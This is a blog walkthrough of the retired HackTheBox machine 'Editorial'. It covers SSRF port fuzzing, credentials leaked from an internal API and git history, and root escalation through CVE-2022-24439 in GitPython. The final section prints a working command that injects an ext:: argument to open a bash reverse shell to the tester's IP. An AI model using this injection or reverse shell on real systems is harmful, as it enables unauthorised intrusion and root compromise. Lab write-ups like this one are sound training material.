---
layout: post
title: Editorial
date: 2025-07-19 02:34:00 +0800
categories: [HackTheBox, Easy]
tags: [Linux, SSRF, SSH, Git, CVE-2022-24439, Sudo Exploit, Privilege Escalation]
author: klein
image:
  path: /images/images-editorial/image_14.png
  
---

This notes-style walkthrough will be conducted using HackTheBox Guided Mode for this retired machine.

### How many TCP ports are listening on Editorial?

```bash
nmap -sC -sV -oN editorial 10.129.183.207 -vv
```

```bash
# Nmap 7.95 scan initiated Sat Jul 19 03:22:26 2025 as: /usr/lib/nmap/nmap -sC -sV -oN editorial -vv 10.129.183.207
Nmap scan report for 10.129.183.207
Host is up, received echo-reply ttl 63 (0.047s latency).
Scanned at 2025-07-19 03:22:26 EDT for 9s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 19 03:22:35 2025 -- 1 IP address (1 host up) scanned in 9.26 seconds

```

### What is the primary domain name used by the webserver on editorial box?

Looking at the Nmap output, we can see that it redirects to editorial.htb, let's add this to the hosts file.

```bash
vim /etc/hosts
```

### What relative endpoint on the webserver can cause the server to generate an outbound HTTP request?

The relative endpoint is /upload-cover, found this by clicking around and looking at all the endpoints in Burp Suite. By clicking on the "Preview" button in the application, the outbound HTTP request is made.

### What TCP port is serving another webserver listening only on localhost?

By playing around with the Book information input boxes, it turns out the page is vulnerable to SSRF. 

By starting a netcat listener and pointing the URL to that netcat listener, we get an important piece of information. The User-Agent reveals that it only it does not allows a lot of not HTTP things, which narrows down our attack vectors.

![b](/images/images-editorial/image_01.png)

The next step would be to fuzz for open ports on localhost, but there is also a cool test we can run before that, testing for IPv6.

```bash
nc -6 -nvlp 9001
```

Look at my IPv6 address.

```bash
ip -6 address
```


![b](/images/images-editorial/image_02.png)

Let's make a request to my machine and change the IP to the IPv6 address and the corresponding port.


![b](/images/images-editorial/image_03.png)

And we got the IPv6 address of the target machine.


![b](/images/images-editorial/image_04.png)


And we can use this address for an Nmap scan. Sometimes we can get lucky and the firewall is only configured on IPv4, and by doing a full port scan on the IPv6 address, we can find additional ports. So cool!

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/editorial]
└─# nmap -6 -vv dead:beef::250:56ff:fe94:b863    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 05:17 EDT
Initiating Ping Scan at 05:17
Scanning dead:beef::250:56ff:fe94:b863 [3 ports]
Completed Ping Scan at 05:17, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:17
Completed Parallel DNS resolution of 1 host. at 05:17, 0.15s elapsed
Initiating SYN Stealth Scan at 05:17
Scanning dead:beef::250:56ff:fe94:b863 [1000 ports]
Discovered open port 22/tcp on dead:beef::250:56ff:fe94:b863
Completed SYN Stealth Scan at 05:17, 0.75s elapsed (1000 total ports)
Nmap scan report for dead:beef::250:56ff:fe94:b863
Host is up, received echo-reply ttl 63 (0.044s latency).
Scanned at 2025-07-19 05:17:18 EDT for 1s
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.11 seconds
           Raw packets sent: 1003 (64.172KB) | Rcvd: 1001 (60.052KB)
```

Let's enumerate the open ports on the box.

We have to intercept a request and change the port to 'FUZZ'.


![b](/images/images-editorial/image_05.png)

Copy this to a file.

Now, let's use ffuf.

```bash
ffuf -request request.req -request-proto http -w <(seq 1 65535) -fr "1630734277837_ebe62757b6e0.jpeg"

```

The -fr part for the case when we do not get that specific string.

This will give back port 5000.

By sending a request to that port, we get back a file.

```bash
curl http://editorial.htb/static/uploads/4d14f540-f80d-44c9-b503-7ec13bc7e794 | jq .

```

```bash
{
  "messages": [
 {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
 }
 },
 {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
 }
 },
 {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
 }
 },
 {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
 }
 }
 ],
  "version": [
 {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
 }
 },
 {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
 }
 }
 ]
}

```

###### Which relative API endpoint returns a template that includes a default username and password?


![b](/images/images-editorial/image_06.png)

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/editorial]
└─# curl http://editorial.htb/static/uploads/abcaf8e8-6a94-4a6f-9504-c12f771f9539 | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   506  100   506    0     0   4732      0 --:--:-- --:--:-- --:--:--  4773
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
    
```

These credentials will work for SSH. Now we are in!

###### What is the full path to the directory that contains a git repo but all the files have been deleted?

&nbsp;

The directory that we land in will contain a .git directory. (/home/dev/apps) 

###### What is the prod user's password on Editorial?

By looking at the commit changes, we will find some deleted credentials.


![b](/images/images-editorial/image_07.png)

###### What is the name of the Python script that the prod user can run as root after entering their password?


![b](/images/images-editorial/image_08.png)

###### What is name of the Python library used by clone_prod_changes.py to interact with Git repos?


![b](/images/images-editorial/image_09.png)


A quick Google search is going to reveal the answer.


![b](/images/images-editorial/image_10.png)

###### What version of GitPython is installed on Editorial?

```bash
pip freeze

```


![b](/images/images-editorial/image_11.png)

###### What is the 2022 CVE ID for a command execution vulnerability in this version of GitPython?

A quick Google search will show the answer to this question.


![b](/images/images-editorial/image_12.png)

Let's use this CVE to escalate privileges to root.

Found this POC exploit, which was used for the follow-up way of doing it.

https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858 

```bash
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c bash% -c% 'bash% -i% >&% /dev/tcp/10.10.14.246/4445% 0>&1'"

```

This way, I got a reverse shell with root.

![b](/images/images-editorial/image_13.png)